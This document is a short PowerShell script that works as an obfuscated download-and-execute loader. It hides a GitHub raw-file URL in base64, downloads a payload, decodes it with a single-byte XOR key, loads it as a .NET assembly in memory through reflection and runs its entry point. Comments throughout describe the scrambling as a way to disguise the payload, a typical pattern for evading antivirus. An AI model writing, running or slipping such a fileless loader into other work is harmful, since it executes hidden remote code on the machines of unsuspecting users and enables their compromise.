# 1. Scrambled URL (Points to your scrambled data.txt)
$u = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l0c2FtYW5tL2RvY3MvbWFpbi9kYXRhLnR4dA=="
$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u))

# 2. Download the 'noise'
$scrambled = (New-Object System.Net.WebClient).DownloadData($url)

# 3. Unscramble the bytes using your key (0x77)
$key = 0x77
for($i=0; $i -lt $scrambled.Length; $i++) {
    $scrambled[$i] = $scrambled[$i] -bxor $key
}

# 4. Use Reflection to load the assembly (Scrambled way)
$load = [System.AppDomain]::CurrentDomain
$a = $load.Load($scrambled)
$a.EntryPoint.Invoke($null, $null)